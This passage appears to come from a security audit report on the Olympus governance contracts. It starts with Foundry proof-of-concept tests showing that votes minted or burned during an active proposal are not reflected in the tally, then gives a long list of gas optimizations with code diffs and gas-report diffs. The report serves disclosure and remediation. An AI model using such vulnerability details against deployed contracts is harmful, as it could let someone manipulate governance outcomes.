governance.vote(true);          assertEq(governance.yesVotesForProposal(1), 300);         assertEq(governance.noVotesForProposal(1), 0);          assertEq(governance.userVotesForProposal(1, voter3), 300);         assertEq(VOTES.balanceOf(voter3), 0);         assertEq(VOTES.balanceOf(address(governance)), 300);          // to simulate calling VoterRegistration.issueVotesTo that mints votes to voter3, VOTES.mintTo is called by godmode here         vm.prank(godmode);         VOTES.mintTo(voter3, 500);         assertEq(VOTES.balanceOf(voter3), 500);          // calling vote function again by voter3 reverts, which means that voter3 cannot additionally vote with the 500 newly minted votes         vm.expectRevert(UserAlreadyVoted.selector);         vm.prank(voter3);         governance.vote(true);     } ```  ```solidity     function testScenario_RevokeVotesAfterUserFinishsOwnVoting() public {         _createActiveProposal();          // voter3 votes for the proposal         vm.prank(voter3);         governance.vote(true);          assertEq(governance.yesVotesForProposal(1), 300);         assertEq(governance.noVotesForProposal(1), 0);          assertEq(governance.userVotesForProposal(1, voter3), 300);         assertEq(VOTES.balanceOf(voter3), 0);         assertEq(VOTES.balanceOf(address(governance)), 300);          // To simulate calling VoterRegistration.revokeVotesFrom that burns voter3's votes, VOTES.burnFrom is called by godmode here.         // However, calling VOTES.burnFrom will revert due to arithmetic underflow.         vm.prank(godmode);         vm.expectRevert(stdError.arithmeticError);         VOTES.burnFrom(voter3, 300);          // the proposal is still voted with voter3's previous votes afterwards         assertEq(governance.userVotesForProposal(1, voter3), 300);         assertEq(VOTES.balanceOf(voter3), 0);         assertEq(VOTES.balanceOf(address(governance)), 300);     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps When `issueVotesTo` and `revokeVotesFrom` are called during voting, the corresponding votes need to be added to or removed from the proposal's voted votes for the user. Alternatively, `issueVotesTo` and `revokeVotesFrom` can be disabled when an active proposal exists.
## Summary  ### Gas Optimizations | |Issue|Instances| |-|:-|:-:| | [G&#x2011;01] | State variables should only be updated once in a function | 1 | | [G&#x2011;02] | Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate | 1 | | [G&#x2011;03] | State variables only set in the constructor should be declared `immutable` | 11 | | [G&#x2011;04] | State variables can be packed into fewer storage slots | 1 | | [G&#x2011;05] | Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas | 5 | | [G&#x2011;06] | Using `storage` instead of `memory` for structs/arrays saves gas | 4 | | [G&#x2011;07] | State variables should be cached in stack variables rather than re-reading them from storage | 7 | | [G&#x2011;08] | Multiple accesses of a mapping/array should use a local variable cache | 1 | | [G&#x2011;09] | The result of function calls should be cached rather than re-calling the function | 3 | | [G&#x2011;10] | `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables | 3 | | [G&#x2011;11] | `internal` functions only called once can be inlined to save gas | 9 | | [G&#x2011;12] | Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement | 1 | | [G&#x2011;13] | `<array>.length` should not be looked up in every loop of a `for`-loop | 1 | | [G&#x2011;14] | Optimize names to save gas | 20 | | [G&#x2011;15] | Using `bool`s for storage incurs overhead | 11 | | [G&#x2011;16] | Use a more recent version of solidity | 3 | | [G&#x2011;17] | `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too) | 7 | | [G&#x2011;18] | Using `private` rather than `public` for constants, saves gas | 11 | | [G&#x2011;19] | Don't compare boolean expressions to boolean literals | 2 | | [G&#x2011;20] | Division by two should use bit shifting | 2 | | [G&#x2011;21] | Superfluous event fields | 7 | | [G&#x2011;22] | Functions guaranteed to revert when called by normal users can be marked `payable` | 36 |  Total: 147 instances over 22 issues  The source diffs can be directly applied to the code by putting the diff block into a file then doing `git apply <file>`  ## Gas Optimizations  ### [G&#x2011;01]  State variables should only be updated once in a function `totalEndorsementsForProposal` is updated twice in this function, but it could be optimized to only update the difference between `previousEndorsement` and `userVotes` instead. Futher optimizations would be to use a `storage` variable rather than looking up the hash of `totalEndorsementsForProposal[proposalId_]` each time, and to use `x = x + a` rather than `x += a`  *There is 1 instance of this issue:* ```solidity File: /src/policies/Governance.sol  192          // undo any previous endorsement the user made on these instructions 193          uint256 previousEndorsement = userEndorsementsForProposal[proposalId_][msg.sender]; 194          totalEndorsementsForProposal[proposalId_] -= previousEndorsement; 195   196          // reapply user endorsements with most up-to-date votes 197          userEndorsementsForProposal[proposalId_][msg.sender] = userVotes; 198:         totalEndorsementsForProposal[proposalId_] += userVotes;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L192-L198  ```diff diff --git a/src/policies/Governance.sol b/src/policies/Governance.sol index 8829e3b..c0e783f 100644 --- a/src/policies/Governance.sol +++ b/src/policies/Governance.sol @@ -191,11 +191,14 @@ contract OlympusGovernance is Policy {            // undo any previous endorsement the user made on these instructions          uint256 previousEndorsement = userEndorsementsForProposal[proposalId_][msg.sender]; -        totalEndorsementsForProposal[proposalId_] -= previousEndorsement;            // reapply user endorsements with most up-to-date votes          userEndorsementsForProposal[proposalId_][msg.sender] = userVotes; -        totalEndorsementsForProposal[proposalId_] += userVotes; +        if (previousEndorsement > userVotes) { +            totalEndorsementsForProposal[proposalId_] -= (previousEndorsement - userVotes); +        } else { +            totalEndorsementsForProposal[proposalId_] += (userVotes - previousEndorsement); +        }            emit ProposalEndorsed(proposalId_, msg.sender, userVotes);      } ```  Note that the numbers below are an underreporting of the gas changes due to [this](https://gist.github.com/0xA5DF/cc71e507d45fd51d708b3e8318654ce5) `forge` issue ```diff diff --git a/tmp/gas_before b/tmp/gas_after index c793374..828386f 100644 --- a/tmp/gas_before +++ b/tmp/gas_after @@ -289,7 +289,7 @@  ╞════════════════════════════════════════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡  │ Deployment Cost                                        ┆ Deployment Size ┆        ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ 1638243                                                ┆ 8250            ┆        ┆        ┆        ┆         │ +│ 1642043                                                ┆ 8269            ┆        ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ Function Name                                          ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -297,7 +297,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ configureDependencies                                  ┆ 47868           ┆ 48513  ┆ 47868  ┆ 51868  ┆ 31      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ endorseProposal                                        ┆ 6874            ┆ 39015  ┆ 30774  ┆ 52674  ┆ 43      │ +│ endorseProposal                                        ┆ 6476            ┆ 38636  ┆ 30376  ┆ 52276  ┆ 43      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ executeProposal                                        ┆ 1850            ┆ 171376 ┆ 238748 ┆ 238748 ┆ 7       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ ```  ### [G&#x2011;02]  Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (**20000 gas**) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save **~42 gas per access** due to [not having to recalculate the key's keccak256 hash](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0) (Gkeccak256 - 30 gas) and that calculation's associated stack operations.  *There is 1 instance of this issue:* ```solidity File: src/policies/Governance.sol  96        mapping(uint256 => ProposalMetadata) public getProposalMetadata; 97     98        /// @notice Return the total endorsements for a proposal id. 99        mapping(uint256 => uint256) public totalEndorsementsForProposal; 100    101       /// @notice Return the number of endorsements a user has given a proposal id. 102       mapping(uint256 => mapping(address => uint256)) public userEndorsementsForProposal; 103    104       /// @notice Return whether a proposal id has been activated. Once this is true, it should never be flipped false. 105       mapping(uint256 => bool) public proposalHasBeenActivated; 106    107       /// @notice Return the total yes votes for a proposal id used in calculating net votes. 108       mapping(uint256 => uint256) public yesVotesForProposal; 109    110       /// @notice Return the total no votes for a proposal id used in calculating net votes. 111       mapping(uint256 => uint256) public noVotesForProposal; 112    113       /// @notice Return the amount of votes a user has applied to a proposal id. This does not record how the user voted. 114       mapping(uint256 => mapping(address => uint256)) public userVotesForProposal; 115    116       /// @notice Return the amount of tokens reclaimed by a user after voting on a proposal id. 117:      mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L96-L117  ### [G&#x2011;03]  State variables only set in the constructor should be declared `immutable` Avoids a Gsset (**20000 gas**) in the constructor, and replaces the first access in each transaction (Gcoldsload - **2100 gas**) and each access thereafter (Gwarmacces - **100 gas**) with a `PUSH32` (**3 gas**).  *There are 11 instances of this issue:* ```solidity File: src/policies/BondCallback.sol  /// @audit aggregator (constructor) 43:           aggregator = aggregator_;  /// @audit aggregator (access) 91:           (, , ERC20 payoutToken, , , ) = aggregator.getAuctioneer(id_).getMarketInfoForPurchase(id_);  /// @audit aggregator (access) 109:          (, , ERC20 payoutToken, ERC20 quoteToken, , ) = aggregator  /// @audit ohm (constructor) 44:           ohm = ohm_;  /// @audit ohm (access) 57:           ohm.safeApprove(address(MINTR), type(uint256).max);  /// @audit ohm (access) 94:           if (address(payoutToken) != address(ohm)) {  /// @audit ohm (access) 118:          if (quoteToken == payoutToken && quoteToken == ohm) {  /// @audit ohm (access) 125:          } else if (quoteToken == ohm) {  /// @audit ohm (access) 131:          } else if (payoutToken == ohm) {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L43  ```solidity File: src/policies/Heart.sol  /// @audit _operator (constructor) 60:           _operator = operator_;  /// @audit _operator (access) 100:          _operator.operate();  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L60  ```diff diff --git a/src/policies/BondCallback.sol b/src/policies/BondCallback.sol index 4da1a3a..4383f7e 100644 --- a/src/policies/BondCallback.sol +++ b/src/policies/BondCallback.sol @@ -25,11 +25,11 @@ contract BondCallback is Policy, ReentrancyGuard, IBondCallback {      mapping(uint256 => uint256[2]) internal _amountsPerMarket;      mapping(ERC20 => uint256) public priorBalances;   -    IBondAggregator public aggregator; +    IBondAggregator immutable public aggregator;      OlympusTreasury public TRSRY;      OlympusMinter public MINTR;      Operator public operator; -    ERC20 public ohm; +    ERC20 immutable public ohm;        /*//////////////////////////////////////////////////////////////                              POLICY INTERFACE diff --git a/src/policies/Heart.sol b/src/policies/Heart.sol index 7693dba..b0a46f2 100644 --- a/src/policies/Heart.sol +++ b/src/policies/Heart.sol @@ -45,7 +45,7 @@ contract OlympusHeart is IHeart, Policy, ReentrancyGuard {      OlympusPrice internal PRICE;        // Policies -    IOperator internal _operator; +    IOperator immutable internal _operator;        /*//////////////////////////////////////////////////////////////                              POLICY INTERFACE ```  Note that the numbers below are an underreporting of the gas changes due to [this](https://gist.github.com/0xA5DF/cc71e507d45fd51d708b3e8318654ce5) `forge` issue ```diff diff --git a/tmp/gas_before b/tmp/gas_after index c793374..1cea2f8 100644 --- a/tmp/gas_before +++ b/tmp/gas_after @@ -24,7 +24,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ allKeycodes                    ┆ 706             ┆ 706    ┆ 706    ┆ 706    ┆ 2       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ executeAction                  ┆ 649             ┆ 156798 ┆ 94565  ┆ 595110 ┆ 767     │ +│ executeAction                  ┆ 649             ┆ 156789 ┆ 94565  ┆ 595110 ┆ 767     │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ executor                       ┆ 2393            ┆ 2393   ┆ 2393   ┆ 2393   ┆ 1       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -258,7 +258,7 @@  ╞═════════════════════════════════════════════════════╪═════════════════╪═══════╪════════╪════════╪═════════╡  │ Deployment Cost                                     ┆ Deployment Size ┆       ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ 1408325                                             ┆ 6934            ┆       ┆        ┆        ┆         │ +│ 1417471                                             ┆ 7248            ┆       ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ Function Name                                       ┆ min             ┆ avg   ┆ median ┆ max    ┆ # calls │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -268,9 +268,9 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ batchToTreasury                                     ┆ 4111            ┆ 12729 ┆ 12068  ┆ 22668  ┆ 4       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ callback                                            ┆ 7678            ┆ 98980 ┆ 85627  ┆ 187927 ┆ 17      │ +│ callback                                            ┆ 7678            ┆ 97563 ┆ 85333  ┆ 183633 ┆ 17      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ configureDependencies                               ┆ 73564           ┆ 73564 ┆ 73564  ┆ 73564  ┆ 63      │ +│ configureDependencies                               ┆ 73464           ┆ 73464 ┆ 73464  ┆ 73464  ┆ 63      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ isActive                                            ┆ 395             ┆ 395   ┆ 395    ┆ 395    ┆ 63      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -282,7 +282,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ setOperator                                         ┆ 8227            ┆ 23461 ┆ 23865  ┆ 23865  ┆ 65      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ whitelist                                           ┆ 8221            ┆ 39608 ┆ 34675  ┆ 67005  ┆ 46      │ +│ whitelist                                           ┆ 8221            ┆ 38018 ┆ 32143  ┆ 62802  ┆ 46      │  ╰─────────────────────────────────────────────────────┴─────────────────┴───────┴────────┴────────┴─────────╯  ╭────────────────────────────────────────────────────────┬─────────────────┬────────┬────────┬────────┬─────────╮  │ src/policies/Governance.sol:OlympusGovernance contract ┆                 ┆        ┆        ┆        ┆         │ @@ -336,13 +336,13 @@  ╞══════════════════════════════════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡  │ Deployment Cost                              ┆ Deployment Size ┆       ┆        ┆       ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ 934119                                       ┆ 4277            ┆       ┆        ┆       ┆         │ +│ 914213                                       ┆ 4290            ┆       ┆        ┆       ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ Function Name                                ┆ min             ┆ avg   ┆ median ┆ max   ┆ # calls │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ active                                       ┆ 323             ┆ 989   ┆ 323    ┆ 2323  ┆ 3       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ beat                                         ┆ 5429            ┆ 29228 ┆ 18552  ┆ 61386 ┆ 8       │ +│ beat                                         ┆ 5429            ┆ 28154 ┆ 17478  ┆ 59238 ┆ 8       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ configureDependencies                        ┆ 24123           ┆ 24123 ┆ 24123  ┆ 24123 ┆ 11      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -397,7 +397,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ isActive                                    ┆ 439             ┆ 439    ┆ 439    ┆ 439    ┆ 63      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ operate                                     ┆ 387             ┆ 122263 ┆ 37958  ┆ 640609 ┆ 104     │ +│ operate                                     ┆ 387             ┆ 121697 ┆ 37958  ┆ 636406 ┆ 104     │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ regenerate                                  ┆ 3772            ┆ 17622  ┆ 21791  ┆ 29292  ┆ 6       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -577,7 +577,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ getFee                                                                  ┆ 872             ┆ 3538   ┆ 4872   ┆ 4872   ┆ 6       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ purchase                                                                ┆ 228899          ┆ 239488 ┆ 239488 ┆ 250077 ┆ 2       │ +│ purchase                                                                ┆ 228739          ┆ 239261 ┆ 239261 ┆ 249783 ┆ 2       │  ╰─────────────────────────────────────────────────────────────────────────┴─────────────────┴────────┴────────┴────────┴─────────╯  ╭────────────────────────────────────────────────────────┬─────────────────┬───────┬────────┬───────┬─────────╮  │ src/test/mocks/KernelTestMocks.sol:MockModule contract ┆                 ┆       ┆        ┆       ┆         │ ```   ### [G&#x2011;04]  State variables can be packed into fewer storage slots If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (**20000 gas**). Reads of the variables can also be cheaper  *There is 1 instance of this issue:* ```solidity File: src/policies/Heart.sol  /// @audit Variable ordering with 5 slots instead of the current 6: ///           uint256(32):lastBeat, uint256(32):reward, user-defined(20):rewardToken, bool(1):active, address(20):PRICE, address(20):_operator 33:       bool public active;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L33  ```diff diff --git a/src/policies/Heart.sol b/src/policies/Heart.sol index 7693dba..ced0bcb 100644 --- a/src/policies/Heart.sol +++ b/src/policies/Heart.sol @@ -29,9 +29,6 @@ contract OlympusHeart is IHeart, Policy, ReentrancyGuard {      event RewardIssued(address to_, uint256 rewardAmount_);      event RewardUpdated(ERC20 token_, uint256 rewardAmount_);   -    /// @notice Status of the 